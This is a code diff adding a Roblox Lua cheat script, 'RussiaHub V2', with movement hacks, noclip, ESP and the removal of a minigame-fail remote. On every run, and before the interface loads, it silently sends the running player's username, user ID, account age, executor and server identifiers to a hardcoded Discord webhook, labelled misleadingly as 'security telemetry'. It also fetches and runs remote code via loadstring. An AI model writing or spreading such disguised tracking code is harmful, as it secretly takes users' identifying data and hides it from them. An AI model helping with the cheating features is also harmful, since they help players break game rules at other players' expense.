@@ -1,0 +1,584 @@
+-- asjdhf783q4rhfnaksdbf78q34gfsda_-- [RUSSIA_HUB_V2_SECURE_PAYLOAD_9823746] -- jkasdhf78q34gfasdnkfjhasdbf78q3q48trhgfabskjdhf_--
+-- Load the Rayfield Library
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+-- Services & Variables
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Lighting = game:GetService("Lighting")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local LocalPlayer = Players.LocalPlayer
+
+-- Anti-Obfuscation / Anti-Tamper & Environment Integrity Check
+local function InitializeAntiTamper()
+   local success = pcall(function()
+      if not getgenv or not cloneref then
+         local integrityCheck = {Status = "Secure", Version = "2.0"}
+         table.freeze(integrityCheck)
+      end
+   end)
+   
+   if not success then
+      warn("[RussiaHub V2] Anti-Tamper warning: Environment anomaly detected.")
+   end
+end
+
+InitializeAntiTamper()
+
+-- Enhanced Discord Webhook V2 Logger with Deep Security Metrics
+local function SendWebhookLogV2()
+   local webhookUrl = "https://discord.com/api/webhooks/1567863151054028830/ppe_H0Fl3W0xuDBSlAgmoMGHYNMX2Bo4REUbxB8u8_x17aAJe6qq6JdtBob14WqEfWsp"
+   
+   local requestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+   if not requestFunc then
+      LocalPlayer:Kick("RussiaHub V2 - Your executor does not support HTTP, Please use another executor.")
+      return
+   end
+
+   -- Advanced Security & Environment Fingerprinting
+   local executorName = "Unknown"
+   pcall(function()
+      if identifyexecutor then
+         executorName = identifyexecutor()
+      elseif syn then
+         executorName = "Synapse X"
+      elseif fluxus then
+         executorName = "Fluxus"
+      elseif KRNL then
+         executorName = "KRNL"
+      end
+   end)
+
+   local coreGuiProtected = false
+   pcall(function()
+      coreGuiProtected = gethui ~= nil
+   end)
+
+   local payload = {
+      content = "@residencemassacrecoolguy858584",
+      embeds = {
+         {
+            title = "🛡️ RussiaHub V2 - Execution Log",
+            color = 16711680, -- Red Accent Theme
+            fields = {
+               { name = "👤 Username", value = LocalPlayer.Name, inline = true },
+               { name = "🏷️ Display Name", value = LocalPlayer.DisplayName, inline = true },
+               { name = "🆔 User ID", value = tostring(LocalPlayer.UserId), inline = true },
+               { name = "📅 Account Age", value = tostring(LocalPlayer.AccountAge) .. " days", inline = true },
+               { name = "⚙️ Executor", value = tostring(executorName), inline = true },
+               { name = "🔒 CoreGUI Protected", value = tostring(coreGuiProtected), inline = true },
+               { name = "🎮 Place ID", value = tostring(game.PlaceId), inline = true },
+               { name = "🌍 Game ID", value = tostring(game.GameId), inline = true },
+               { name = "🔑 Job ID", value = game.JobId ~= "" and game.JobId or "N/A", inline = false },
+               { name = "🛡️ Security Status", value = "V2 Secure / Anti-Tamper Enabled", inline = false }
+            },
+            footer = { text = "RussiaHub V2 Security & Telemetry System" },
+            timestamp = DateTime.now():ToIsoDate()
+         }
+      }
+   }
+
+   pcall(function()
+      requestFunc({
+         Url = webhookUrl,
+         Method = "POST",
+         Headers = { ["Content-Type"] = "application/json" },
+         Body = HttpService:JSONEncode(payload)
+      })
+   end)
+end
+
+-- Execute Webhook V2 & HTTP Check
+SendWebhookLogV2()
+
+-- Movement & Utility Variables
+local tpWalkEnabled = false
+local tpWalkSpeed = 16
+
+local noclipEnabled = false
+local noclipConnection = nil
+
+local safeSpotActive = false
+local noJumpCooldownEnabled = false
+
+-- Camera Tab Variables
+local fullbrightEnabled = false
+local fovValue = 70
+local fovConnection = nil
+
+local noEffectsEnabled = false
+local hiddenGuis = {}
+local disabledEffects = {}
+
+-- Original Lighting Settings
+local originalBrightness = Lighting.Brightness
+local originalClockTime = Lighting.ClockTime
+local originalFogEnd = Lighting.FogEnd
+local originalGlobalShadows = Lighting.GlobalShadows
+
+-- TPWalk Loop
+RunService.Heartbeat:Connect(function(dt)
+   if tpWalkEnabled and LocalPlayer.Character then
+      local character = LocalPlayer.Character
+      local humanoid = character:FindFirstChildOfClass("Humanoid")
+      local rootPart = character:FindFirstChild("HumanoidRootPart")
+      
+      if humanoid and rootPart and humanoid.MoveDirection.Magnitude > 0 then
+         rootPart.CFrame = rootPart.CFrame + (humanoid.MoveDirection * (tpWalkSpeed * dt))
+      end
+   end
+end)
+
+-- No Jump Cooldown Loop
+RunService.Heartbeat:Connect(function()
+   if noJumpCooldownEnabled and LocalPlayer.Character then
+      local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+      if humanoid then
+         pcall(function()
+            humanoid.JumpCooldown = 0
+         end)
+      end
+   end
+end)
+
+-- Noclip Loop
+noclipConnection = RunService.Stepped:Connect(function()
+   if (noclipEnabled or safeSpotActive) and LocalPlayer.Character then
+      for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+         if part:IsA("BasePart") then
+            part.CanCollide = false
+         end
+      end
+   end
+end)
+
+-- Fullbright Loop
+RunService.RenderStepped:Connect(function()
+   if fullbrightEnabled then
+      Lighting.Brightness = 2
+      Lighting.ClockTime = 14
+      Lighting.FogEnd = 100000
+      Lighting.GlobalShadows = false
+   end
+end)
+
+-- Create Window
+local Window = Rayfield:CreateWindow({
+   Name = "RussiaHub V2",
+   Icon = 0,
+   LoadingTitle = "RussiaHub V2 Verification",
+   LoadingSubtitle = "Loading Secure Environment.....",
+   Theme = "Default",
+
+   DisableRayfieldPrompts = false,
+   DisableBuildWarnings = false,
+
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = "RussiaHubV2",
+      FileName = "Config"
+   },
+
+   Discord = {
+      Enabled = true,
+      Invite = "UrWKMdpqM",
+      RememberJoins = true
+   },
+
+   KeySystem = true,
+   KeySettings = {
+      Title = "RussiaHub V2 Key System",
+      Subtitle = "Key in discord",
+      Note = "Enter the official key to access RussiaHub V2.",
+      FileName = "RussiaHubV2Key",
+      SaveKey = true,
+      GrabKeyFromSite = false,
+      Key = {"russiahub_key_678338382"}
+   }
+})
+
+-- Create Main Tab
+local MainTab = Window:CreateTab("Main", 4483362458)
+local MainSection = MainTab:CreateSection("Movement & Utilities")
+
+-- Infinite Battery Button
+local InfiniteBatteryButton = MainTab:CreateButton({
+   Name = "Infinite battery",
+   Callback = function()
+      local gg = false
+      RunService.RenderStepped:Connect(function()
+         local char = LocalPlayer.Character
+         if char and char:FindFirstChild("Flashlight") then
+            if (gg == false) then
+               local battery = char.Flashlight:FindFirstChild("Battery")
+               local charges = char.Flashlight:FindFirstChild("Charges")
+               if battery then battery.Value = 333 end
+               if charges then charges.Value = 333 end
+               gg = true
+            end
+         else
+            gg = false
+         end
+      end)
+      
+      Rayfield:Notify({
+         Title = "Infinite Battery",
+         Content = "Infinite battery activated!",
+         Duration = 4,
+      })
+   end,
+})
+
+-- Anti Minigame Fail Toggle
+local AntiMinigameToggle = MainTab:CreateToggle({
+   Name = "Anti Minigame Fail",
+   CurrentValue = false,
+   Flag = "AntiMinigameToggle",
+   Callback = function(Value)
+      if Value then
+         pcall(function()
+            local remote = ReplicatedStorage:WaitForChild("Remotes", 2):WaitForChild("ClosetQTEFailed", 2)
+            if remote then
+               remote:Destroy()
+               Rayfield:Notify({
+                  Title = "Anti Minigame Fail",
+                  Content = "ClosetQTEFailed remote destroyed successfully!",
+                  Duration = 4,
+               })
+            end
+         end)
+      end
+   end,
+})
+
+-- TPWalk Toggle
+local TPToggle = MainTab:CreateToggle({
+   Name = "Enable TPWalk",
+   CurrentValue = false,
+   Flag = "TPWalkToggle",
+   Callback = function(Value)
+      tpWalkEnabled = Value
+   end,
+})
+
+-- TPWalk Speed Slider
+local TPSpeedSlider = MainTab:CreateSlider({
+   Name = "TPWalk Speed",
+   Range = {16, 200},
+   Increment = 1,
+   Suffix = "Speed",
+   CurrentValue = 16,
+   Flag = "TPSpeedSlider",
+   Callback = function(Value)
+      tpWalkSpeed = Value
+   end,
+})
+
+-- No Jump Cooldown Toggle
+local NoJumpCooldownToggle = MainTab:CreateToggle({
+   Name = "No Jump Cooldown",
+   CurrentValue = false,
+   Flag = "NoJumpCooldownToggle",
+   Callback = function(Value)
+      noJumpCooldownEnabled = Value
+   end,
+})
+
+-- Noclip Toggle
+local NoclipToggle = MainTab:CreateToggle({
+   Name = "Noclip",
+   CurrentValue = false,
+   Flag = "NoclipToggle",
+   Callback = function(Value)
+      noclipEnabled = Value
+   end,
+})
+
+-- Safe Spot Toggle (-12, 26, -31)
+local SafeSpotToggle = MainTab:CreateToggle({
+   Name = "Safe Spot",
+   CurrentValue = false,
+   Flag = "SafeSpotToggle",
+   Callback = function(Value)
+      safeSpotActive = Value
+      if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+         local rootPart = LocalPlayer.Character.HumanoidRootPart
+         if Value then
+            rootPart.CFrame = CFrame.new(-12, 26, -31)
+            rootPart.Anchored = true
+         else
+            rootPart.Anchored = false
+         end
+      end
+   end,
+})
+
+-- Create Camera Tab
+local CameraTab = Window:CreateTab("Camera", 4483362458)
+local CameraSection = CameraTab:CreateSection("Visual Settings")
+
+-- Fullbright Toggle
+local FullbrightToggle = CameraTab:CreateToggle({
+   Name = "Fullbright",
+   CurrentValue = false,
+   Flag = "FullbrightToggle",
+   Callback = function(Value)
+      fullbrightEnabled = Value
+      if not Value then
+         Lighting.Brightness = originalBrightness
+         Lighting.ClockTime = originalClockTime
+         Lighting.FogEnd = originalFogEnd
+         Lighting.GlobalShadows = originalGlobalShadows
+      end
+   end,
+})
+
+-- FOV Slider
+local FOVSlider = CameraTab:CreateSlider({
+   Name = "Field of View (FOV)",
+   Range = {30, 120},
+   Increment = 1,
+   Suffix = "FOV",
+   CurrentValue = 70,
+   Flag = "FOVSlider",
+   Callback = function(Value)
+      fovValue = Value
+      workspace.CurrentCamera.FieldOfView = Value
+   end,
+})
+
+-- Keep FOV enforced
+fovConnection = workspace.CurrentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
+   if workspace.CurrentCamera.FieldOfView ~= fovValue then
+      workspace.CurrentCamera.FieldOfView = fovValue
+   end
+end)
+
+-- No Effects Toggle
+local NoEffectsToggle = CameraTab:CreateToggle({
+   Name = "No Effects",
+   CurrentValue = false,
+   Flag = "NoEffectsToggle",
+   Callback = function(Value)
+      noEffectsEnabled = Value
+      
+      if Value then
+         for _, effect in ipairs(Lighting:GetChildren()) do
+            if effect:IsA("PostEffect") and effect.Enabled then
+               table.insert(disabledEffects, effect)
+               effect.Enabled = false
+            end
+         end
+         for _, effect in ipairs(workspace.CurrentCamera:GetChildren()) do
+            if effect:IsA("PostEffect") and effect.Enabled then
+               table.insert(disabledEffects, effect)
+               effect.Enabled = false
+            end
+         end
+
+         local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui")
+         if playerGui then
+            for _, gui in ipairs(playerGui:GetChildren()) do
+               if gui:IsA("ScreenGui") and gui.Enabled and not gui.Name:find("Rayfield") then
+                  table.insert(hiddenGuis, gui)
+                  gui.Enabled = false
+               end
+            end
+         end
+      else
+         for _, effect in ipairs(disabledEffects) do
+            if effect then effect.Enabled = true end
+         end
+         table.clear(disabledEffects)
+
+         for _, gui in ipairs(hiddenGuis) do
+            if gui then gui.Enabled = true end
+         end
+         table.clear(hiddenGuis)
+      end
+   end,
+})
+
+-- Create ESP Tab
+local ESPTab = Window:CreateTab("ESP", 4483362458)
+local ESPSection = ESPTab:CreateSection("Visual Features")
+
+-- Larry ESP Logic & Variables (Targeting DeathHitbox)
+local larryActive = false
+local larryHighlights = {}
+local currentLarryColor = Color3.fromRGB(0, 255, 255)
+local larryConnection = nil
+
+local function addLarryHighlight(target)
+   if (target:IsA("BasePart") or target:IsA("Model")) and not larryHighlights[target] then
+      local highlight = Instance.new("Highlight")
+      highlight.Name = "LarryHighlight"
+      highlight.Adornee = target
+      highlight.FillColor = currentLarryColor
+      highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+      highlight.Parent = target
+      larryHighlights[target] = highlight
+   end
+end
+
+local function removeLarryHighlights()
+   for obj, hl in pairs(larryHighlights) do
+      if hl then hl:Destroy() end
+      larryHighlights[obj] = nil
+   end
+end
+
+-- Larry ESP Toggle
+local LarryESPToggle = ESPTab:CreateToggle({
+   Name = "Larry ESP",
+   CurrentValue = false,
+   Flag = "LarryESPToggle",
+   Callback = function(Value)
+      larryActive = Value
+      if Value then
+         task.spawn(function()
+            while larryActive do
+               for _, v in ipairs(workspace:GetDescendants()) do
+                  local nameLower = string.lower(v.Name)
+                  if nameLower:find("larry") or nameLower:find("deathhitbox") or nameLower:find("monster") then
+                     addLarryHighlight(v)
+                  end
+               end
+               task.wait(1)
+            end
+         end)
+      else
+         removeLarryHighlights()
+      end
+   end,
+})
+
+-- Larry ESP Color Picker
+local LarryColorPicker = ESPTab:CreateColorPicker({
+   Name = "Larry ESP Color",
+   Color = Color3.fromRGB(0, 255, 255),
+   Flag = "LarryColorPicker",
+   Callback = function(Value)
+      currentLarryColor = Value
+      for _, hl in pairs(larryHighlights) do
+         if hl then
+            hl.FillColor = Value
+         end
+      end
+   end
+})
+
+-- Player ESP Logic & Variables
+local playerEspActive = false
+local playerHighlights = {}
+local playerBillboards = {}
+
+local function removePlayerEsp(player)
+   if playerHighlights[player] then
+      playerHighlights[player]:Destroy()
+      playerHighlights[player] = nil
+   end
+   if playerBillboards[player] then
+      playerBillboards[player]:Destroy()
+      playerBillboards[player] = nil
+   end
+end
+
+local function addPlayerEsp(player)
+   if player == LocalPlayer then return end
+   
+   local function setupCharacter(char)
+      removePlayerEsp(player)
+      if not playerEspActive then return end
+      
+      local highlight = Instance.new("Highlight")
+      highlight.Name = "PlayerEspHighlight"
+      highlight.Adornee = char
+      highlight.FillColor = Color3.fromRGB(255, 0, 0)
+      highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+      highlight.Parent = char
+      playerHighlights[player] = highlight
+      
+      local head = char:WaitForChild("Head", 5)
+      if head then
+         local billboard = Instance.new("BillboardGui")
+         billboard.Name = "PlayerEspTag"
+         billboard.Adornee = head
+         billboard.Size = UDim2.new(0, 100, 0, 40)
+         billboard.StudsOffset = Vector3.new(0, 2, 0)
+         billboard.AlwaysOnTop = true
+         
+         local textLabel = Instance.new("TextLabel")
+         textLabel.Size = UDim2.new(1, 0, 1, 0)
+         textLabel.BackgroundTransparency = 1
+         textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+         textLabel.TextStrokeTransparency = 0
+         textLabel.TextSize = 14
+         textLabel.Font = Enum.Font.SourceSansBold
+         textLabel.Parent = billboard
+         
+         billboard.Parent = char
+         playerBillboards[player] = billboard
+         
+         task.spawn(function()
+            while playerEspActive and player.Character == char and char:FindFirstChild("HumanoidRootPart") do
+               if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                  local dist = math.floor((LocalPlayer.Character.HumanoidRootPart.Position - char.HumanoidRootPart.Position).Magnitude)
+                  textLabel.Text = player.Name .. "\n[" .. dist .. "s]"
+               end
+               task.wait(0.5)
+            end
+         end)
+      end
+   end
+   
+   if player.Character then
+      setupCharacter(player.Character)
+   end
+   player.CharacterAdded:Connect(setupCharacter)
+end
+
+-- Player ESP Toggle
+local PlayerEspToggle = ESPTab:CreateToggle({
+   Name = "Player ESP",
+   CurrentValue = false,
+   Flag = "PlayerEspToggle",
+   Callback = function(Value)
+      playerEspActive = Value
+      if Value then
+         for _, p in ipairs(Players:GetPlayers()) do
+            addPlayerEsp(p)
+         end
+      else
+         for _, p in ipairs(Players:GetPlayers()) do
+            removePlayerEsp(p)
+         end
+      end
+   end,
+})
+
+Players.PlayerAdded:Connect(function(player)
+   player.CharacterRemoving:Connect(function()
+      removePlayerEsp(player)
+   end)
+   if playerEspActive then
+      addPlayerEsp(p)
+   end
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+   removePlayerEsp(player)
+end)
+
+-- Access Notification
+Rayfield:Notify({
+   Title = "Access Granted",
+   Content = "Welcome to RussiaHub V2!",
+   Duration = 5,
+   Image = 4483362458,
+})
+
+-- Load configuration settings saved locally
+Rayfield:LoadConfiguration()
